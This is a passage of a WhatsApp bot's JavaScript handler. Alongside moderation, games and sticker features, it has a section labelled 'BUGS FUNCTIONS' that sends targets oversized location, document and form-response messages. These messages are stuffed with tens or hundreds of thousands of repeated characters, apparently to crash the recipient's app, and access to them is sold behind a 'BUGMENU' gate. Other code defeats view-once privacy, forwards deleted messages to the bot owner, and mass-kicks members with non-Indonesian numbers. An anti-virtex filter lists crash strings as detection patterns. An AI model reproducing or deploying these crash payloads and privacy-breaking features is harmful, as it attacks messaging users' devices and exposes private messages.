            addSpam("Case", senderNumber, "10s", AntiSpam)
            addSpammer(senderNumber, spammer)
            return setReply("`YOO,STOP SPAMMING CMD`")
        }
        if (isCmd && !isOwner) msgFilter.addFilter(from)
 
        //Auto Sticker Online
        if (db.data.sticker[budy]) {
            if (cekSpam("NotCase", senderNumber, AntiSpam)) return
            addSpam("NotCase", senderNumber, "5s", AntiSpam)
            conn.sendMessage(from, {
                sticker: {
                    url: db.data.sticker[budy].link
                }
            }, {
                quoted: dev
            })
        }
        //Auto VN Online  
        if (db.data.audio[budy]) {
            if (cekSpam("NotCase", senderNumber, AntiSpam)) return
            let nono = {
                key: {
                    fromMe: false,
                    participant: `0@s.whatsapp.net`,
                    ...(from ? {
                        remoteJid: "16505434800@s.whatsapp.net"
                    } : {})
                },
                message: {
                    "extendedTextMessage": {
                        "text": `${pushname} \n「 audio 」 ${db.data.audio[budy].name}`,
                        "title": `Hmm`,
                        'jpegThumbnail': fs.readFileSync('./database/blueimages/thumb.jpeg')
                    }
                }
            }
            const iniQuoted = mentionByReply ? m.quoted.fakeObj : nono
            conn.sendMessage(from, {
                audio: {
                    url: db.data.audio[budy].link
                },
                ptt: true,
                mimetype: 'audio/mpeg'
            }, {
                quoted: iniQuoted
            })
            addSpam("NotCase", senderNumber, "5s", AntiSpam)
        }
        //onlyOwner
        const onlyOwner = async () => {
            let teks = Ehztext(``)
            let contextInfo = {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterJid,
                    serverMessageId: 100,
                    newsletterName
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'ACCESS DENIED ❌',
                    body: '',
                    previewType: "PHOTO",
                    thumbnailUrl: pickRandom(fotoRandom),
                    sourceUrl: ''
                }
            }

            conn.sendMessage(from, {
                contextInfo,
                text: `${teks}`
            }, {
                quoted: ftoko
            })
        }
        //onlyAdmin
        const onlyAdmin = async () => {
            let teks = Ehztext(`*\`HUH\`*`)
            let contextInfo = {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterJid,
                    serverMessageId: 100,
                    newsletterName
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'ACCESS DENIED ❌',
                    body: '',
                    previewType: "PHOTO",
                    thumbnailUrl: pickRandom(fotoRandom),
                    sourceUrl: ''
                }
            }

            conn.sendMessage(from, {
                contextInfo,
                text: `${teks}`
            }, {
                quoted: ftoko
            })
        }
        //onlyAdmin
        const onlyBadmin = async () => {
            let teks = Ehztext(`*\`HUH\`*`)
            let contextInfo = {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterJid,
                    serverMessageId: 100,
                    newsletterName
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'ACCESS DENIED ❌',
                    body: '',
                    previewType: "PHOTO",
                    thumbnailUrl: pickRandom(fotoRandom),
                    sourceUrl: ''
                }
            }

            conn.sendMessage(from, {
                contextInfo,
                text: `${teks}`
            }, {
                quoted: ftoko
            })
        }
        //onlyPremium
        const onlyBuyer = async () => {
            let teks = Ehztext(`𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗢𝗪𝗡𝗘𝗥 𝗧𝗢 𝗔𝗖𝗖𝗘𝗦𝗦 𝗕𝗨𝗚𝗠𝗘𝗡𝗨❤️‍🔥 *(.owner)*`)
            let contextInfo = {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterJid,
                    serverMessageId: 100,
                    newsletterName
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'ＡＣＣＥＳＳ ＤＥＮＩＥＤ❌',
                    body: '',
                    previewType: "PHOTO",
                    thumbnailUrl: pickRandom(fotoRandom),
                    sourceUrl: ''
                }
            }

            conn.sendMessage(from, {
                contextInfo,
                text: `${teks}`
            }, {
                quoted: ftoko
            })
        }
        //onlyGroup
        let teks = Ehztext(`Hallo ${pushname}\nSaat Ini Tindakan kamu di batasi oleh Dev Kenshin\nMinta Acc Dulu ya`)
        const onlyGroup = async () => {
            let contextInfo = {
                forwardingScore: 999,
                isForwarded: true,
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterJid,
                    serverMessageId: 100,
                    newsletterName
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: 'ＡＫＳＥＳ ＤＩ ＴＯＬＡＫ ❌',
                    body: '',
                    previewType: "PHOTO",
                    thumbnailUrl: pickRandom(fotoRandom),
                    sourceUrl: ''
                }
            }

            conn.sendMessage(from, {
                contextInfo,
                text: `${teks}\n` + readmore + `\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺ ${week} , ${calender}`
            }, {
                quoted: ftoko
            })
        }
        const onlyLimit = async () => {
            //let image = fs.readFileSync("stik/bot.jpg")
            let yameteh = `*乂 Limit - Expired*

Maaf kak @${sender.split('@')[0]} limit kamu sudah habis!`
            conn.sendMessage(from, {
                text: yameteh
            }, {
                quoted: fkontak
            })
        }
        // This case was invented by BLUE DEMON
        if (global.autoreact && isMessage) {
            try {
                // Define an array of emojis
const emojis = [
    "😊", "👍", "😂", "🥶", "😵",
    "😘", "😑", "😤", "😍", "😎", 
    "😋", "🤗", "🥰", "😜", "😌", 
    "😬", "🙃", "😈", "😏", "🥳", 
    "🤩", "😅", "🤭", "😷", "😴", 
    "🤔", "😮", "😬", "😪", "😅", 
    "😓", "😤", "🥺", "🤐", "😔", 
    "😞", "😳", "😜", "😝", "🥶", 
    "😇", "🙄", "😡", "😬", "🤧", 
    "😩", "😏", "😶", "😳", "😋", 
    "😌", "😆", "🤭", "🤩", "😺",
    "😶‍🌫️", "😤", "🤯", "😱", "🥵", 
    "😶", "😕", "🤑", "🤒", "🤧", 
    "🤮", "🤫", "🥸", "😧", "😞",
    "🫣", "🥱", "🤐", "😮‍💨", "🤠"
];
                // Function to pick a random emoji
                const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];

                // Ensure the message has a valid key before sending a reaction
                if (m.key && m.key.remoteJid && m.key.id) {
                    const randomEmoji = getRandomEmoji();

                    // Send the reaction
                    await conn.sendMessage(m.chat, {
                        react: {
                            text: randomEmoji,
                            key: m.key
                        }
                    });
                }
            } catch (error) {
                // Handle errors and log them for debugging
                console.error("Error in AutoReact:", error.message || error);
            }
        }
        const onlyGlimit = async () => {
            //let image = fs.readFileSync("stik/bot.jpg") // Sementara tar gw ganti image nya
            let kyahh = `*乂 Limit - Expired*
Maaf kak @${sender.split('@')[0]} limit game kamu sudah habis!`
            conn.sendMessage(from, {
                text: kyahh
            }, {
                quoted: fkontak
            })
        }
        // SendAnti
        const sendAnti = (teks) => {
            let contextInfo = {
                mentionedJid: [sender],
                externalAdReply: {
                    showAdAttribution: true,
                    title: `${botName}`,
                    body: `${baileysVersion}`,
                    previewType: "PHOTO",
                    thumbnailUrl: pickRandom(fotoRandom),
                    sourceUrl: `${sgc}`
                }
            }

            conn.sendMessage(from, {
                contextInfo,
                text: `${teks}\n` + readmore + `\n⫹⫺ @${sender.split('@')[0]}\n⫹⫺ ${week} , ${calender}`
            }, {
                quoted: fkontak
            })
        }
        //AUTO BIO BOT
        if (settings) {} else global.db.data.settings['settingbot'] = {
            status: new Date() * 1,
        }
        if ((new Date() * 1 - settings.status > 2000) && settings && settings.autoBio) {
            let data = global.db.data.others['runtime']
            let time = (new Date - data.runtime)
            let bio = `${botName} 🤖 || 🌎 MODE: ${publik? 'PUBLIC' : 'SELF'} || 🎨 CREATE BY ${ownerName}`
            await conn.updateProfileStatus(bio).catch(_ => _)
            settings.status = new Date() * 1
        }
        // Function Loading 
        async function loading() {
            let emotLoad = [`${themeemoji}`]
            await conn.sendMessage(from, {
                react: {
                    text: emotLoad,
                    key: m.key
                }
            })
        }
        async function loadingx() {
            let emotLoaderr = ["💱"]
            await conn.sendMessage(from, {
                react: {
                    text: emotLoaderr,
                    key: m.key
                }
            })
        }
        async function killing() {
            let emotLoad = [`😈`]
            await conn.sendMessage(from, {
                react: {
                    text: emotLoad,
                    key: m.key
                }
            })
        }
        const bugres = '›› ༂ 𝕬𝖙𝖙𝖆𝖈𝖐𝖎𝖓𝖌 💥😈༗ ༂'
        //BUGS FUNCTIONS
        const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        async function ngeloc(target, kuwoted) {
            var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        "liveLocationMessage": {
                            "degreesLatitude": "p",
                            "degreesLongitude": "sv PannOfficiaL",
                            "caption": `💧⃟💧⃟𒆜𝕯𝖊𝖒𝖔𝖓𒆜𝖗𝖊𝖇𝖔𝖗𝖓 ⃟╳╳🐦‍🔥.xp` + "ꦾ".repeat(50000),
                            "sequenceNumber": "0",
                            "jpegThumbnail": ""
                        }
                    }
                }
            }), {
                userJid: target,
                quoted: kuwoted
            })
            await conn.relayMessage(target, etc.message, {
                participant: {
                    jid: target
                },
                messageId: etc.key.id
            })
        }
        async function BLEKING(LockJids, QUOTED) {
            var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
                "stickerMessage": {
                    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
                    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                    "mimetype": "image/webp",
                    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
                    "fileLength": "10116",
                    "mediaKeyTimestamp": "1715876003",
                    "isAnimated": false,
                    "stickerSentTs": "1715881084144",
                    "isAvatar": false,
                    "isAiSticker": false,
                    "isLottie": false
                }
            }), {
                userJid: LockJids,
                quoted: QUOTED
            });
            await conn.relayMessage(LockJids, etc.message, {
                participant: {
                    jid: LockJids
                },
                messageId: etc.key.id
            });
        }
        async function bakdok(target, kuwoted) {
            var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
                "documentMessage": {
                    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                    "mimetype": "penis",
                    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                    "fileLength": "999999999",
                    "pageCount": 999999999,
                    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                    "fileName": `💧⃟𒆜𝕯𝖊𝖒𝖔𝖓𒆜𝖗𝖊𝖇𝖔𝖗𝖓 ⃟╳🐦‍🔥.xp` + "ྦྷ".repeat(60000),
                    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                    "mediaKeyTimestamp": "1715880173"
                }
            }), {
                userJid: target,
                quoted: kuwoted
            });
            await conn.relayMessage(target, etc.message, {
                participant: {
                    jid: target
                },
                messageId: etc.key.id
            });
        }
        //Make Sticker
        async function makeSticker(media, Sticker, StickerTypes) {
            let jancok = new Sticker(media, {
                pack: packName, // The pack name
                author: authorName, // The author name
                type: StickerTypes.FULL, // The sticker type
                categories: ['🤩', '🎉'], // The sticker category
                id: '12345', // The sticker id
                quality: 70, // The quality of the output file
                background: '#FFFFFF00' // The sticker background color (only for full stickers)
            })
            let stok = getRandom(".webp")
            let nono = await jancok.toFile(stok)
            let nah = fs.readFileSync(nono)
            await conn.sendMessage(from, {
                sticker: nah
            }, {
                quoted: dev
            })
            await fs.unlinkSync(stok)
        }


        //-------------------- 》SECURITY《 ------------------\\
        //ANTI VIEWONCE 
        if ((type == 'viewOnceMessage' || isQuotedViewOnce) && (isAntiViewOnce || budy.startsWith("Readviewonce"))) {
            const {
                downloadContentFromMessage
            } = (await import('@whiskeysockets/baileys')).default
            if (isQuotedViewOnce) {
                var view = m.quoted.message
            } else {
                var view = m.message.viewOnceMessage.message
            }

            let Type = Object.keys(view)[0]
            let media = await downloadContentFromMessage(view[Type], Type == 'imageMessage' ? 'image' : 'video')
            let buffer = Buffer.from([])
            for await (const chunk of media) {
                buffer = Buffer.concat([buffer, chunk])
            }
            if (/video/.test(Type)) {
                conn.sendFile(m.chat, buffer, 'media.mp4', view[Type].caption || '', m)
            } else if (/image/.test(Type)) {
                conn.sendFile(m.chat, buffer, 'media.jpg', view[Type].caption || '', m)
            }
        }
        // ANTI BOT
        if (isGroup && isAntiBot) {
            if (m.isBaileys && m.fromMe == false) {
                if (!isBotGroupAdmins) {} else {
                    sendAnti(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
                    return await conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
                }
            }
        }
        // ANTI IMAGE
        if (isGroup && isAntiImage && isHanMedia) {
            if (isHanMedia === "imageMessage") {
                if (isGroupAdmins) return setReply('*IMAGE DETECTED*\n*')
                if (!isBotGroupAdmins) {} else {
                    sendAnti(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry,Karna Saya Menghapus Nya, Karna admin/owner Mengaktifkan Anti-Image Pada Groip Ini`)
                    return conn.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.key.id,
                            participant: m.key.participant
                        }
                    })
                }
            }
        }
        // ANTI VIDEO
        if (isGroup && isAntiVideo && isHanMedia) {
            if (isHanMedia === "videoMessage") {
                if (!isBotGroupAdmins) {} else {
                    sendAnti(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, Because I Deleted It, Because Admin/Owner Activated Anti-Video On This Group`)
                    return conn.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.key.id,
                            participant: m.key.participant
                        }
                    })
                }
            }
        }
        // ANTI STICKER 
        if (isGroup && isAntiSticker && isHanMedia) {
            if (isHanMedia === "stickerMessage") {
                if (!isBotGroupAdmins) {} else {
                    sendAnti(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry,Karna Saya Menghapus Nya, Karna admin/owner Mengaktifkan Anti-Sticker Pada Groip Ini`)
                    return conn.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.key.id,
                            participant: m.key.participant
                        }
                    })
                }
            }
        }
        // ANTI AUDIO
        if (isGroup && isAntiAudio && isHanMedia) {
            if (isHanMedia === "audioMessage") {
                if (!isBotGroupAdmins) {} else {
                    sendAnti(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry,Karna Saya Menghapus Nya, Karna admin/owner Mengaktifkan Anti-Audio Pada Groip Ini`)
                    return conn.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false,
                            id: m.key.id,
                            participant: m.key.participant
                        }
                    })
                }
            }
        }
        //ANTI LINK GROUP

        if (isGroup && isAntilinkGc && budy.includes(`chat.whatsapp.com`)) {
            if (isGroupAdmins) return setReply('*「 GROUP LINK DETECTED 」*\nAs a group admin, you are allowed to send links.');
            if (!isBotGroupAdmins) return setReply('*「 GROUP LINK DETECTED 」*\nI am not an admin, so I cannot delete the message or take action.');
            if (ownerNumber.includes(sender)) return setReply('*「 GROUP LINK DETECTED 」*\nAs the bot owner, you are exempt from the group antilink restrictions.');

            let linkgc = await conn.groupInviteCode(from);
            if (budy.includes(`${linkgc}`)) {
                return setReply('*「 GROUP LINK DETECTED 」*\nThis is the group link, so no action will be taken.');
            }

            await setReply('*「 GROUP LINK DETECTED 」*\nYou have sent a prohibited group link. As per the rules of this group, action will be taken.');
            await sleep(2000);

            if (isBotGroupAdmins) {
                await conn.sendMessage(from, {
                    delete: m.key
                });
                conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => {
                    setReply('*「 GROUP LINK DETECTED 」*\nFailed to remove the user. Ensure the bot has the necessary admin permissions.');
                });
            }
        }

        //Auto kick jika itu user yang sudah di tandai
        if (kickon) {
            if (isGroup && kickon.includes(sender)) {

                let teks = `${senderNumber} tidak di izinkan masuk
karena dia telah keluar dari group ini sebelumnya,
dan juga sudah di tandai sebagai user biadap`
                await conn.sendMessage(from, {
                    text: teks,
                    contextInfo: {
                        mentionedJid: [sender]
                    }
                }, {
                    quoted: dev
                })
                if (!isBotGroupAdmins) return conn.sendMessage(from, {
                    text: `Gagal  mengeluarkan @${sender} dari group karena bot bukan admin`,
                    contextInfo: {
                        mentionedJid: [sender]
                    }
                }, {
                    quoted: dev
                })
                if (isBotGroupAdmins) conn.groupParticipantsUpdate(from, [sender], 'remove')
            }
        }
if (type === 'protocolMessage' && global.antidelete) {
    let mess = chatUpdate.messages[0].message.protocolMessage;

    try {
        // Extract the chat and message details
        let chats = Object.entries(await conn.chats).find(([user, data]) => 
            data.messages && data.messages[mess.key.id]
        );

        if (chats && chats[1] !== undefined) {
            let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]));

            // Prepare the info about where the message was deleted
            let info = `🛑 *Deleted Message Detected*\n\n` +
                       `📍 *Chat/Group Name:* ${chats[1]?.metadata?.subject || "Private Chat"}\n` +
                       `👤 *Sender:* ${msg.pushName || "Unknown"}\n` +
   ` > ${caption}`;

            // Forward the deleted message to botNumber
            await conn.sendMessage(botNumber, { text: info });
            await conn.copyNForward(botNumber, msg).catch(e => console.log(e, msg));
        }
    } catch (error) {
        console.error("Error handling anti-delete:", error);
    }
}
        //ANTI LINK 
        if (isGroup && isAntiLink) {
            if (budy.includes(`https:`)) {
                if (isGroupAdmins) return setReply(`*「 LINK DETECTED 」*\n> *GROUP ADMINS ARE EXCEPTIONAL*`)
                if (ownerNumber.includes(sender)) return setReply(`*「 LINK DETECTED  」*`)
                let linkgc = await conn.groupInviteCode(from)
                if (budy.includes(`${linkgc}`)) return reply(`*「 GROUP LINK DETECTED  」*\n> *Almost kicked you ✌️*`)
                if (budy.includes('blue') || budy.includes('admin')) return reply('*「 GROUP LINK DETECTED  」*\nADMIN PERMISSION RECEIVED')
                setReply(` *「 LINK DETECTED 」*\n> You sent a link, sorry you were kicked from the group`)
                setTimeout(() => {
                    if (isBotGroupAdmins) conn.sendMessage(from, {
                        delete: m.key
                    })
                    conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => {
                        setReply(`BOT MUST BE ADMIN`)
                    })
                }, 2000)
            }
        }

        //ANTI ASING/BULE OK
        if (isGroup && isBotGroupAdmins && isKickarea && !itsMe) {
            let member = await groupMembers.map(u => u.id)
            for (let i = 0; i < member.length; i++) {
                if (member[i].slice(0, 2) !== "62") {
                    let usersId = await groupMembers.find(u => u.id == member[i])
                    if (!usersId.groupAdmins) {
                        await conn.groupParticipantsUpdate(from, [member[i]], 'remove')
                        await sleep(1000)
                    }
                }
            }
        }

        //ANTI VIRUS
        if (isGroup && isAntiVirtex) {
            if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ')) {
                if (isGroupAdmins) return setReply('*VIRTEX DETECTED*')
                console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
                conn.sendMessage(m.chat, `*TANDAI TELAH DIBACA*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Bang yg ngirim virtex nih:* \nwa.me/${sender.split("@")[0]}`)
                if (!isBotGroupAdmins) {
                    return
                }
                if (isOwner) {
                    return
                }
                await conn.groupParticipantsUpdate(from, [sender], 'remove')
                conn.sendMessage(from, {
                    delete: m.key
                })
                await conn.sendMessage(`${botNumber}@s.whatsapp.net`, {
                    text: `*Hey owner a virtex was detected ${isGroup?`in ${groupName} group*`:''}`
                })
            }
        }


        //ANTI WA.ME
        if (isGroup && isAntiWame) {
            if (budy.includes('https://wa.me') || budy.includes('wa.me') || budy.includes('Https://wa.me') || budy.includes('Wa.me')) {
                if (!isBotGroupAdmins) {
                    return
                }
                setReply(`*LINK WA ME TERDETEKSI*\n\nMaaf bot akan menghapus link tersebut!!,\n\nhubungi Admin  untuk mematikan fitur anti wame`)
                conn.sendMessage(from, {
                    delete: m.key
                })
            }
        }
        // Secreto
        if (!isGroup) {
            if (!dev.key.fromMe && secreto.find(i => i.sender === sender)) {
                var dbx = secreto.find(i => i.sender === sender)
                if (dbx.status === 'ENTER-MESSAGE') {
                    if (['conversation', 'extendedTextMessage'].includes(dev.type)) {
                        var teks_balasan = `Hi ,you received a reply message.\n\n Reply Message:\n${budy}\n\n\n_Remember, only send this message once, okay?_`
                        conn.sendMessage(dbx.pengirim, {
                            text: teks_balasan
                        })
                        reply(`Successfully sent reply, remember this message is only sent once.`)
                    } else {
                        var teks_balasan = `Hai kak, kamu menerima pesan balasan nih\n\nPesan Balasannya :\n${budy}\n\n\n_ingat pesan ini satu kali kirim saja yaa_`
                        var pes = await conn.sendMessage(dbx.pengirim, {
                            text: teks_balasan
                        })
                        conn.sendMessage(dbx.pengirim, {
                            forward: dev
                        }, {
                            quoted: pes
                        })
                        reply(`Sukses mengirimkan balasan, ingat pesan ini satu kali kirim saja yaa`)
                    }
                    var pos = secreto.indexOf(dbx)
                    secreto.splice(pos, 1)
                    fs.writeFileSync('./database/secreto_balas.json', JSON.stringify(secreto, null, 2))
                }
            }
        }




        //GAME MATH FUNCTION
        conn.math = conn.math ? conn.math : {}
        if (isGroup && from in conn.math) {
            if (!isGroup) {
                return
            }
            //console.log(conn.math)
            try {
                let id = from
                if (!(id in conn.math) && /^apa hasil dari/i.test(budy)) return setReply('soal itu sudah berakhir')
                let math = JSON.parse(JSON.stringify(conn.math[id][1]))
                if (budy == math.result) {
                    user.balance += math.bonus
                    clearTimeout(conn.math[id][3])
                    delete conn.math[id]
                    await setReply(` benar\n\nSaldo: Rp${math.bonus}\n\nmath ${math.mode}`)
                } else {
                    /*
if (--conn.math[id][2] == 0) {
clearTimeout(conn.math[id][3])
delete conn.math[id]
setReply(`*kesempatan habis!*\njawabannya adalah *${math.result}*`)
} else setReply(`*jawaban salah!*\nmasih ada ${conn.math[id][2]} kesempatan`)
}
*/
                }
            } catch (err) {
                console.log(err)
            }
        }

        //GAME  teka teki Function
        conn.tekateki = conn.tekateki ? conn.tekateki : {}
        if (isGroup && from in conn.tekateki) {
            if (!isGroup) {
                return
            }
            const similarity = require('similarity')
            const threshold = 0.72
            let id = m.chat
            let json = JSON.parse(JSON.stringify(conn.tekateki[id][1]))

            if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
                user.balance += conn.tekateki[id][2]
                var teks1 = `*GAME TEKATEKI*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tekateki[id][2]} Money 💸`
                reply(teks1)
                clearTimeout(conn.tekateki[id][3])
                delete conn.tekateki[id]
            } else if (similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
        }


        //GAME tebak kimia Function
        conn.tebakkimia = conn.tebakkimia ? conn.tebakkimia : {}
        if (isGroup && from in conn.tebakkimia) {
            if (!isGroup) {
                return
            }
            const similarity = require('similarity')
            const threshold = 0.72
            let id = m.chat
            let json = JSON.parse(JSON.stringify(conn.tebakkimia[id][1]))
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(budy)

            if (budy.toLowerCase() == json.lambang.toLowerCase().trim()) {
                user.balance += conn.tebakkimia[id][2]
                global.db.data.users[m.sender].exp += 10
                var teks3 = `*GAME TEBAK KIMIA*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebakkimia[id][2]} Money 💸`
                reply(teks3)
                clearTimeout(conn.tebakkimia[id][3])
                delete conn.tebakkimia[id]
            } else if (similarity(budy.toLowerCase(), json.lambang.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
            // else setReply(`*Salah!*`)
        }



        //GAME Caklontong Function
